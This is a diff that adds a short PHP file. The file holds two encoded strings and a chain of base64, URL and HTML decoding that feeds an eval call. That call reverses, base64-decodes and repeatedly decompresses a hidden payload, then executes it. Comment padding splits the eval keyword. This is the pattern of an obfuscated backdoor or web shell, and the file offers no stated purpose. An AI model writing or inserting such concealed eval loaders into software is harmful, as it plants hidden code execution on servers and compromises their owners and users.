@@ -1,0 +1,7 @@
+<?php
+
+$yee = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHVrNDUlMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
+$uk45 = "==gYrRNhc7YrJ8Q+X1rO6BcZuDnph1SNFYf1cQbvfzEQb/2wy4AGlc07dnnejew/54HS9H0h9/avS9Bx3pOatZq2g6u5AVwstX2hnn9NWmv1ZV+mWkF9MFzAil/H4FIfW8iY77jsrXd0F2B7Z2YvHYpjAOouhnGv4gCbIsrP0cSR0hWplLQXZBQMfxzSgEDQwaSazqLwWgV4r66s6Ya9Ghmm5Z7pJ/kH/kD+/I6Lt1evD0h76LV26KTVmlO1cSmUPurbDL9yaTaChIE4vDyegbAEgQsaBHdpci3/rAA1BwJe/DCAfHw/bAA5B8vFAkeA";
+eval/*****/(htmlspecialchars_decode(urldecode(base64_decode($yee))));
+exit;
+?>
